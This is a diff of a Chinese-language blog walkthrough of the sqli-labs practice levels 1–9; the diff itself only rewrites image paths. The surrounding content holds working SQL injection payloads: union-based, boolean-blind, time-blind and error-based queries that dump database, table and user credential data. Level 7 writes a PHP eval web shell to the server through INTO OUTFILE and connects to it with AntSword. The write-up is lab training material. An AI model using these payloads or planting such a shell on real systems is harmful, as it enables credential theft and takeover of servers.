@@ -504,60 +504,60 @@
 <h2 id="第一关（基于错误的GET单引号字符型注入）"><a href="#第一关（基于错误的GET单引号字符型注入）" class="headerlink" title="第一关（基于错误的GET单引号字符型注入）"></a><strong>第一关（基于错误的GET单引号字符型注入）</strong></h2><p>手工UNION联合查询注入</p>
 <p>   <strong>1.根据提示输入id作为带数值的参数</strong></p>
 <p>输入后</p>
-<p><img src="./sqli-labs1-10/1.png"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/1.png"></p>
 <p><strong>2.判断注入类型</strong>  </p>
 <p>输入 and 1=2无反应，说明不是数字型</p>
 <p>输入单引号报错</p>
-<p><img src="./sqli-labs1-10/2.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/2.png" alt="img"></p>
 <p>但是输入–+注释后又正常，说明此处为单引号字符型注入</p>
 <p><strong>3.判断列数</strong></p>
 <p>使用order by判断列数，order by 3正常  order by4不正常</p>
 <p>说明有三列</p>
-<p><img src="./sqli-labs1-10/3.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/3.png" alt="img"></p>
 <p><strong>4.使用联合查询（id值应不存在）爆出数据库名 表明 列名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/4.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/4.png" alt="img"></p>
 <p>可以看出2 3出有回显  我们在此处进行sql注入</p>
 <p>爆数据库名</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,database(),user()--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/5.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/5.png" alt="img"></p>
 <p>可以看出数据库名为 security  用户为root</p>
 <p><strong>爆表名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema ='security'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/6.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/6.png" alt="img"></p>
 <p><strong>爆列名</strong></p>
 <p>将所有表列名爆一遍发现users存在可以用信息username和password</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name ='users'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/7.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/7.png" alt="img"></p>
 <p><strong>爆字段</strong></p>
 <p>分别爆出username 和password</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,database(),group_concat(username) from security.users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/8.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/8.png" alt="img"></p>
 <pre class="line-numbers language-none"><code class="language-none">?id=-1' union select 1,database(),group_concat(password) from security.users--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/9.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/9.png" alt="img"></p>
 <p>至此第一关结束。</p>
 <h2 id="第二关（基于错误的GET型注入）"><a href="#第二关（基于错误的GET型注入）" class="headerlink" title="第二关（基于错误的GET型注入）"></a><strong>第二关（基于错误的GET型注入）</strong></h2><p><strong>1.根据提示输入id作为带数值的参数</strong></p>
-<p><img src="./sqli-labs1-10/10.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/10.png" alt="img"></p>
 <p><strong>2.判断注入类型</strong></p>
 <p>输入 and 1=2页面消失说明为数字型</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=1 and 1=2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/11.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/11.png" alt="img"></p>
 <p><strong>3.判断列数</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">?id=1 order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/12.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/12.png" alt="img"></p>
 <p>经尝试发现存在3列</p>
 <p><strong>4.联合查询（在and 1=2下）</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">?id=1 and 1=2 union select 1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/13.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/13.png" alt="img"></p>
 <p>之后按照步骤依次爆出数据库、表名、列名、字段</p>
 <p>参考第一关</p>
 <h2 id="第三关（基于错误的GET单引号变形字符输入）"><a href="#第三关（基于错误的GET单引号变形字符输入）" class="headerlink" title="第三关（基于错误的GET单引号变形字符输入）"></a><strong>第三关（基于错误的GET单引号变形字符输入）</strong></h2><p><strong>1.根据提示输入id作为带数值的参数</strong></p>
@@ -573,13 +573,13 @@
 <p><strong>3.判断列数</strong></p>
 <p><strong>4.联合查询（在id不存在下）</strong></p>
 <h2 id="第五关（双注入GET单引号字符注入）"><a href="#第五关（双注入GET单引号字符注入）" class="headerlink" title="第五关（双注入GET单引号字符注入）"></a><strong>第五关（双注入GET单引号字符注入）</strong></h2><p><strong>根据提示输入id</strong></p>
-<p><img src="./sqli-labs1-10/14.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/14.png" alt="img"></p>
 <p>看到此报错信息，第一反应就是布尔型盲注、报错型注入、时间延迟型盲注</p>
 <p>下面给出验证时间延迟型盲注：</p>
 <pre class="line-numbers language-none"><code class="language-none">?id=1' and sleep(5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>发现有明显延迟</p>
-<p><img src="./sqli-labs1-10/15.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/15.png" alt="img"></p>
 <p>接下来思路是通过延迟依次爆出数据库长度、数据库名、表名、列名、字段</p>
 <p><strong>方法一：延迟型手工注入：</strong></p>
 <p>此注入正确会延迟，错误没有延迟。id无所谓，因为不看回显，通过浏览器的刷新提示观察延迟情况，但是id正确时有利于观察。</p>
@@ -589,13 +589,13 @@
 爆库长payload= 
 ?id=1' and if(length(database())=8,sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/16.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/16.png" alt="img"></p>
 <p>当为8时出现明显延迟，库长为8</p>
 <p><strong>爆库名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">爆库名payload=
 ?id=1' and if(left(database(),1)='s',sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/17.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/17.png" alt="img"></p>
 <p>出现明显延迟，说明数据库名第一位为’s’,接下来以此增加 left(database(),字符长度)中的字符长度，等号右边依次爆破下一个字符，出现延迟则正确。最终得到left(database(),8)=’security’</p>
 <p><strong>爆表名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">爆表名payload= 
@@ -609,7 +609,7 @@
 ?id=1' and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)='users',sleep(5),1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>limit 3,1的意思是从第四个数据开始取一个数据，即指第四个表名users</p>
-<p><img src="./sqli-labs1-10/18.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/18.png" alt="img"></p>
 <p><strong>爆列名</strong></p>
 <p>经过很长时间发现第五个跟第六个列名分别为username和psssword,payload分别如下</p>
 <pre class="line-numbers language-none"><code class="language-none">username payload= ?id=1' and if(left((select column_name from information_schema.columns where table_name='users' limit 4,1),8)='username',sleep(5),1)--+
@@ -631,7 +631,7 @@ password payload=
 ?id=1' and left((select database()),1)='s'--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>手工注入时，可以使用left((select database()),1)&lt;’t’ 使用二分法快速爆破</p>
-<p><img src="./sqli-labs1-10/19.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/19.png" alt="img"></p>
 <p>经过长时间努力发现库名为 security</p>
 <pre class="line-numbers language-none"><code class="language-none">payload= 
 ?id=1' and left((select database()),8)='security'--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -661,20 +661,20 @@ password payload=
 <p><strong>爆库名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">?id=1' and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 4,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ payload= (select schema_name from information_schema.schemata limit 4,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/20.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/20.png" alt="img"></p>
 <p>1是floor语句输出的一部分，不管输出什么结果都有1</p>
 <p><strong>爆表名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">?id=1' and (select 1 from (select count(*),concat(((select table_name from information_schema.tables where table_schema=database() limit 3,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ payload= (select table_name from information_schema.tables where table_schema=database() limit 3,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/21.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/21.png" alt="img"></p>
 <p><strong>爆列名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">?id=1' and (select 1 from (select count(*),concat(((select column_name from information_schema.columns where table_name='users' limit 4,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ payload= (select column_name from information_schema.columns where table_name='users' limit 4,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/22.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/22.png" alt="img"></p>
 <p><strong>爆字段</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">?id=1' and (select 1 from (select count(*),concat(((select username from security.users limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+ payload= (select username from security.users limit 0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/23.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/23.png" alt="img"></p>
 <p>password同理</p>
 <h2 id="第六关（双注入GET双引号字符型注入）"><a href="#第六关（双注入GET双引号字符型注入）" class="headerlink" title="第六关（双注入GET双引号字符型注入）"></a><strong>第六关（双注入GET双引号字符型注入）</strong></h2><p>   此关与第五关类似，却别是使用””的方式闭合字符串</p>
 <p>只需将id=1’ 改为?id=1”即可</p>
@@ -683,34 +683,34 @@ password payload=
 <ol>
 <li>首先我们输入?id=1观察页面</li>
 </ol>
-<p><img src="./sqli-labs1-10/24.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/24.png" alt="img"></p>
 <p>2.然后我们输入and 1=2页面正常  图同1</p>
 <p>3.接下来我们输入单引号’报错，说明可能存在注入</p>
-<p><img src="./sqli-labs1-10/25.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/25.png" alt="img"></p>
 <p>4.然而当我们输入 ?id=1’–+页面依然出错 图同3</p>
 <p>5.接着我们尝试输入?id=1’)–+ 页面依然出错 图同3</p>
 <p>6.接着我们尝试输入?id=1’))–+ 发现页面终于正常</p>
-<p><img src="./sqli-labs1-10/26.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/26.png" alt="img"></p>
 <p>由于本题提示是导出文件GET字符型注入</p>
 <p>然后我们尝试写入文件</p>
 <pre class="line-numbers language-none"><code class="language-none">payload=   注意使用\\ 
 ?id=1')) union select 1,2,3 into outfile "具体的文件夹路径\\xx.php"--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>虽然报错但是我们查询文件夹发现文件创建成功</p>
-<p><img src="./sqli-labs1-10/27.png" alt="img"></p>
-<p><img src="./sqli-labs1-10/28.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/27.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/28.png" alt="img"></p>
 <p>接着我们上传一句话木马</p>
 <p>需要注意的是我们使用file权限向操作系统写入文件时，对于相同的文件名的文件不能覆盖，所 以如果第一次上传yuan.php，下次再上传yuan.php时就是无效命令了，新的yuan.php不会覆盖 原有的yuan.php</p>
 <pre class="line-numbers language-none"><code class="language-none">http://sql/Less-7/?id=1')) union select 1,"&lt;?php @eval($_POST['chopper']);?&gt;",3 into outfile"D:\\phpstudy_pro\\WWW\\sqli-labs-master\\yuan1.php"--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./sqli-labs1-10/29.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/29.png" alt="img"></p>
 <p>接着我们使用蚁剑连接</p>
-<p><img src="./sqli-labs1-10/30.png" alt="img"></p>
-<p><img src="./sqli-labs1-10/31.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/30.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/31.png" alt="img"></p>
 <p>成功连接！</p>
 <h2 id="第八关（布尔型单引号GET型盲注）"><a href="#第八关（布尔型单引号GET型盲注）" class="headerlink" title="第八关（布尔型单引号GET型盲注）"></a><strong>第八关（布尔型单引号GET型盲注）</strong></h2><p>参考第五关布尔型注入</p>
 <p>经过尝试发现为单引号注入</p>
-<p><img src="./sqli-labs1-10/32.png" alt="img"></p>
+<p><img src="/2021/02/16/sqli-labs1-10/32.png" alt="img"></p>
 <p>接下来爆库名、表名、列名、字段</p>
 <p>payload参考第五关</p>
 <h2 id="第九关（基于时间的GET单引号盲注）"><a href="#第九关（基于时间的GET单引号盲注）" class="headerlink" title="第九关（基于时间的GET单引号盲注）"></a><strong>第九关（基于时间的GET单引号盲注）</strong></h2><p>参考第五关时间延迟型盲注</p>
